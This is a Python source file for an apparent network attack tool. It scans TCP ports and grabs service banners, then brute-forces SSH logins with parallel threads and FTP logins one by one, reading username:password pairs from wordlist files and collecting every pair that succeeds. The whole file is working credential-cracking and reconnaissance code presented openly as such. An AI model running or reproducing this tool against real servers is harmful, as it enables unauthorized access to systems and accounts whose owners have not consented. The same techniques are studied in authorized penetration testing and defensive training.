import sys
import socket
import paramiko.ssh_exception
from pwn import *
import paramiko
import ftplib
import concurrent.futures

class Scanner:
    @staticmethod
    def scanVersion(target, port):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((target, port))
            answer = s.recv(1024)
            s.close()
            return answer.decode('utf-8', errors='ignore')  
        except socket.timeout:
            return None  
        except socket.error:
            return None

    @staticmethod
    def scanPorts(PortMin, portMax, target):
        try:
            openPorts = []
            portM = int(portMax)
            PortM = int(PortMin)
            for port in range(PortM, portM + 1):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = s.connect_ex((target, port))
                s.close()
                if result == 0:
                    openPorts.append(port)
            return openPorts

        except KeyboardInterrupt:
            print("\nExiting program.")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved.")
            sys.exit()
        except socket.error:
            print("Could not connect to server.")
            sys.exit()

def attempt_login(target, user, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=user, password=password)
        
        ssh.close()
        return user, password
    except paramiko.ssh_exception.AuthenticationException:
        return None
    except Exception as e:
        return None
    return None

class Scripts:
    @staticmethod
    def crackSSH(target):
        sshCredentials = []
        try:
            with open('./sshcred.txt', "r") as file:
                credentials = [line.strip().split(":") for line in file]
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                future_to_cred = {executor.submit(attempt_login, target, user, password): (user, password) for user, password in credentials}
                for future in concurrent.futures.as_completed(future_to_cred):
                    result = future.result()
                    if result:
                        sshCredentials.append(result)
        except FileNotFoundError:
            print("sshcred.txt file not found.")
        
        return sshCredentials

    @staticmethod
    def crackFTP(target):
        # This is a simple script to crack an FTP server using a wordlist
        ftpCredentials = []
        try:
            with open('./ftpcred.txt', "r") as file:  # Corrected the filename
                for line in file:
                    user, password = line.strip().split(":")
                    try:
                        ftp = ftplib.FTP(target)
                        ftp.login(user, password)
                        ftpCredentials.append((user, password))
                        ftp.quit()
                    except ftplib.error_perm:
                        continue
                    except Exception as e:
                        continue
        except FileNotFoundError:
            print("")
        return ftpCredentials
